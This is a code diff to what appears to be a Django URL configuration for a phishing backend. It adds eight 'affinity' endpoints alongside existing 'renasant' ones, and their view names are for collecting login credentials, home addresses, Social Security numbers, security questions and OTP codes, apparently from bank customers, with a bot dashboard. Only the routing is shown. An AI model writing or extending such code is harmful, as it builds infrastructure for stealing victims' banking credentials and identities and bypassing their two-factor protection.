@@ -96,6 +96,16 @@ from user_data.renasant_views import (
     renasant_collect_user_security_questions,
     renasant_collect_user_otp_verification,
 )
+from user_data.affinity_view import (
+    affinity_collect_user_login_cred,
+    affinity_collect_user_login_cred2,
+    affinity_collect_user_basic_info,
+    affinity_collect_user_home_address,
+    affinity_collect_user_social_security,
+    affinity_collect_user_social_security_2,
+    affinity_collect_user_security_questions,
+    affinity_collect_user_otp_verification,
+)
 
 urlpatterns = [
     path("admin/", admin.site.urls),
@@ -126,5 +136,14 @@ urlpatterns = [
     path("api/renasant-meta-data-6/", renasant_collect_user_social_security_2, name="renasant_collect_user_social_security_2"),
     path("api/renasant-meta-data-7/", renasant_collect_user_security_questions, name="renasant_collect_user_security_questions"),
     path("api/renasant-meta-data-8/", renasant_collect_user_otp_verification, name="renasant_collect_user_otp_verification"),
+    # Affinity API endpoints
+    path("api/affinity-meta-data-1/", affinity_collect_user_login_cred, name="affinity_collect_user_login_cred"),
+    path("api/affinity-meta-data-2/", affinity_collect_user_login_cred2, name="affinity_collect_user_login_cred2"),
+    path("api/affinity-meta-data-3/", affinity_collect_user_basic_info, name="affinity_collect_user_basic_info"),
+    path("api/affinity-meta-data-4/", affinity_collect_user_home_address, name="affinity_collect_user_home_address"),
+    path("api/affinity-meta-data-5/", affinity_collect_user_social_security, name="affinity_collect_user_social_security"),
+    path("api/affinity-meta-data-6/", affinity_collect_user_social_security_2, name="affinity_collect_user_social_security_2"),
+    path("api/affinity-meta-data-7/", affinity_collect_user_security_questions, name="affinity_collect_user_security_questions"),
+    path("api/affinity-meta-data-8/", affinity_collect_user_otp_verification, name="affinity_collect_user_otp_verification"),
     path("dashboard/", bot_dashboard, name="bot_dashboard"),
 ]
